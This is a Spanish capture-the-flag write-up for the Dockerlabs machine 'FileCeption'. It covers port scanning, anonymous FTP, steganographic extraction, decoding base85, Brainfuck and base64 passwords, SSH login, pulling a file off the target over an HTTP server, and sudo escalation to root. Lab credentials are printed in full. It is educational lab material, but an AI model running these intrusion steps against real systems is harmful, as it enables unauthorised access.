
# Writeup Template: Maquina `[ FileCeption ]`

- Tags: #FleCeption
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina FileCeption](https://mega.nz/file/sGci1A5L#r0I4p-iA9Pj2WKu40PgMkFzXDtKmJ3_FU4vdRp7xl-4)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x fileception.zip
sudo bash auto_deploy.sh fileception.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---
## Enumeracion de [Servicio  FTP]
Procedemos a enumerar este servicio:
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2
```

Tenemos la siguiente informacion y tenemos capacidad de escritura:
Usuario **anonymous** habilitado.
```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
-rwxrw-rw-    1 ftp      ftp         75372 Apr 27  2024 hello_peter.jpg [NSE: writeable]
```

Realizamos la peticion con **curl** apuntando al usario **anonymous**
```bash
curl ftp://172.17.0.2 --user "anonymous"
```

Procedemos a descargar los recursos para este usuario:
```bash
wget -r ftp://anonymous:@172.17.0.2/
```

Tenemos una imagen: **hello_peter.jpg**
Ahora lo primero que aremos ver que tipo de archivo es:
```bash
file hello_peter.jpg
hello_peter.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 799x798, components 3
```

Verificamos si existen cadenas legibles:
```bash
strings hello_peter.jpg # No reporta nada critico
```

Verificamos si existe archivos incrustado:
```bash
binwalk hello_peter.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

Verificamos si existen datos ocultos:
```bash
steghide info hello_peter.jpg
"hello_peter.jpg":
  formato: jpeg
  capacidad: 4.0 KB
�Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
steghide: �no pude extraer ning�n dato con ese salvoconducto!
```

Verificamos los metadatos:
```bash
exiftool hello_peter.jpg
ExifTool Version Number         : 13.25
File Name                       : hello_peter.jpg
Directory                       : .
File Size                       : 75 kB
File Modification Date/Time     : 2024:04:27 00:00:00+00:00
File Access Date/Time           : 2025:06:17 20:29:05+00:00
File Inode Change Date/Time     : 2025:06:17 20:29:05+00:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 799
Image Height                    : 798
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 799x798
Megapixels                      : 0.638
```

Por el momento no encontramos nada critico asi que pasamos a revisar la web y si existe algun login tendremos un usario potencial:
```bash
peter
```
## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```

Revisando el codigo fuente detectamos lo siguiente:
```bash
<!-- 
¡Hola, Peter!
¿Te acuerdas los libros que te presté de esteganografía? ¿A que estaban buenísimos?
Aquí te dejo una clave que usaras sabiamente en el momento justo. Por favor, no seas tan obvio, la vida no se trata de fuerza bruta.
@UX=h?T9oMA7]7hA7]:YE+*g/GAhM4
Solo te comento, recuerdo que usé este método porque casi nadie lo usa... o si. Lamentablemente, a mi también se me olvido. Solo recuerdo que era base
-->
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,pl
```

- **Hallazgos**:
	No reporta nada critico

Ahoro usaremos [CyberCheef](https://gchq.github.io/CyberChef/#recipe=From_Base85('!-u',true,'z')&input=QFVYPWg/VDlvTUE3XTdoQTddOllFKypnL0dBaE00&oeol=FF) y utilizamos el formato **base85** para decodificar la cadena:
```bash
@UX=h?T9oMA7]7hA7]:YE+*g/GAhM4

base_85_decoded_password # Nos reporta desde cybercheef
```

Ahora lo que aremos es de la imagen que habiamos descargado intentar extraer de la imagen los archivos ocultos:
Aqui en: Anotar salvoconducto: ponemos: **@UX=h?T9oMA7]7hA7]:YE+*g/GAhM4**
```bash
steghide extract -sf hello_peter.jpg
Anotar salvoconducto: 
```

Ahora tenemos un archivo:
```bash
anot� los datos extra�dos e/"you_find_me.txt".
```

Si revisamos el contenido vemos lo siguiente:
```bash
Hola, Peter!

Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook! Ook?  Ook. Ook?  Ook. Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook
.  Ook. Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook? Ook.  Ook? Ook.  Ook? Ook.  Ook? Ook.  Ook! Ook!  Ook? Ook!  Ook. Ook?  Ook. Ook?  Ook. Ook?  Ook! Ook!  Ook! Ook!  Ook! 
Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook! Ook.  Ook? Ook.  Ook! Ook!  Ook! Ook.  Ook! Ook.  Ook. Ook.  Ook! Ook.  Oo
k. Ook?  Ook! Ook.  Ook? Ook.  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook.  Ook. Ook.  Ook! Ook.  Ook. Ook?  Ook! Ook.  Ook! Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook. 
 Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook! Ook.  Ook! Ook.  Ook? Ook.  Ook! Ook!  Ook! Ook.  Ook. Ook.  Ook! Ook.
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos ese contendio asi que le pasamos ese contenido a **Deepseek** para que informacion nos puede dar:
Indica que el formato es **Brainfuck** y el resultado en decodificado es:
```bash
9h889h23hhss2
```

### Intrusion
Tenemos la posible contrasena del usuario **peter** asi que nos intentarmeos conectar por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh peter@172.17.0.2 # ( 9h889h23hhss2 )
```

---
## Escalada de Privilegios
### Enumeracion del Sistema

**Hallazgos Clave:**
Listamos los permisos de este usaurio tenemos lo siguiente: **nota_importante.txt**
### Explotacion de Privilegios

###### Usuario `[ petter ]`:
Viendo el contenido del archivo tenemos la data:
```bash
NO REINICIES EL SISTEMA!!

HAY UN ARCHIVO IMPORTANTE EN TMP
```

Ahora estamos en **tmp** y tenemos los siguientes archivos:
```bash
importante_octopus.odt
recuerdos_del_sysadmin.txt
```

Ahora verificamos que existe el binario de **python3**
```bash
which python3
```

Nos traemos el bianario a nuestro equipo:
```bash
python3 -m http.server 8080
```

realizamos la peticion para descargarlol en nuestra maquina de atacante:
```bash
curl http://172.17.0.2:8080/importante_octopus.odt --output importante_octopus.zip
```

Procedemos a descomprimirlo:
```bash
7z x importante_octopus.zip
```

Ahora tenemos muchos archivos:
```bash
 Configurations2   META-INF   Thumbnails   content.xml   importante_octopus.txt   importante_octopus.zip   leerme.xml   manifest.rdf   meta.xml   mimetype   settings.xml   styles.xml
```

Vemos el contenido del archivo: **leerme.xml**
```bash
 Decirle a Peter que me pase el odt de mis anécdotas, en caso de que se me olviden mis credenciales de administrador... Él no sabe de Esteganografía, nunca sé lo imaginaria esto.
 
 usuario: octopus
 password: ODBoMjM4MGgzNHVvdW8zaDQ=
```

Tenemos las credenciales el **base64** del usuario **octopus**, Para decodificarlas ejecutamos el siguiente comando:
```bash
echo -n "ODBoMjM4MGgzNHVvdW8zaDQ=" | base64 -d
```

y obtenemos lo siguiente:
```bash
80h2380h34uouo3h4
```

Migramos al usuario: **octopus**
```bash
# Comando para escalar al usuario: ( octopus )
su octopus # ( 80h2380h34uouo3h4 )
```
###### Usuario `[ octopus ]`:
Listando los permisos del usuario vemos que podemos ejecutar cualquier comando como cualquier usuario:
```bash
User octopus may run the following commands on d6b8e2f83c62:
    (ALL) NOPASSWD: ALL
    (ALL : ALL) ALL
```

Explotando privilegio:
```bash
# Comando para escalar al usuario: ( root )
```

```bash
sudo su # ( 80h2380h34uouo3h4 )
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@d6b8e2f83c62:/home/octopus# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a abusar del usuario **anonymous** del servicio **FTP**
2. Aprendimos a realizar **Esteganografia** para obtener archiivos ocultos
3. Aprendimos a abusar de los permisos de usuarios para migrar al usuario privilegiado del sistema
